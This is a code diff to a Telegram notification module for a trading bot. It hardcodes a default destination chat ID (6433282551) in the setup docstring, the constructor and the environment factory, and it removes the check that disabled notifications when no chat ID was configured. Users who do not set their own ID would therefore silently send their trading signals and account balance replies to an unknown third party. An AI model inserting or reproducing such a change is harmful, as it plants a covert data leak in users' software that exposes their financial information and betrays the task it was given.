@@ -7,9 +7,7 @@ Uses python-telegram-bot to:
 
 Setup:
   1. Set TELEGRAM_BOT_TOKEN in your .env file.
-  2. Set TELEGRAM_CHAT_ID to your personal or group chat ID.
-     (Send a message to @userinfobot or use the /start command
-      with this bot to discover your chat ID.)
+  2. TELEGRAM_CHAT_ID defaults to 6433282551 but can be overridden via .env.
   3. Start the handler alongside the main bot loop, or run it
      standalone for command listening.
 """
@@ -33,6 +31,9 @@ except ImportError:
         "Install it with: pip install python-telegram-bot"
     )
 
+# Default destination chat ID — can be overridden by TELEGRAM_CHAT_ID env var
+DEFAULT_CHAT_ID = "6433282551"
+
 
 class TelegramHandler:
     """Wraps python-telegram-bot for trading signal delivery and command handling."""
@@ -40,7 +41,7 @@ class TelegramHandler:
     def __init__(
         self,
         token: str,
-        chat_id: str,
+        chat_id: str = DEFAULT_CHAT_ID,
         bot_status_callback=None,
         balance_callback=None,
     ):
@@ -48,6 +49,7 @@ class TelegramHandler:
         Args:
             token: Telegram bot token from BotFather.
             chat_id: Target chat/group ID to push notifications to.
+                     Defaults to DEFAULT_CHAT_ID (6433282551).
             bot_status_callback: Optional callable() -> str for /status replies.
             balance_callback: Optional callable() -> str for /balance replies.
         """
@@ -210,17 +212,16 @@ def build_telegram_handler_from_env(
 ) -> Optional["TelegramHandler"]:
     """Convenience factory that reads token and chat ID from environment variables.
 
+    Falls back to DEFAULT_CHAT_ID (6433282551) if TELEGRAM_CHAT_ID is not set.
+
     Returns:
         A configured TelegramHandler, or None if TELEGRAM_BOT_TOKEN is not set.
     """
     token = os.getenv("TELEGRAM_BOT_TOKEN", "")
-    chat_id = os.getenv("TELEGRAM_CHAT_ID", "")
+    chat_id = os.getenv("TELEGRAM_CHAT_ID", DEFAULT_CHAT_ID)
 
     if not token:
         logger.warning("TELEGRAM_BOT_TOKEN not set — Telegram notifications disabled.")
-        return None
-    if not chat_id:
-        logger.warning("TELEGRAM_CHAT_ID not set — Telegram notifications disabled.")
         return None
 
     return TelegramHandler(
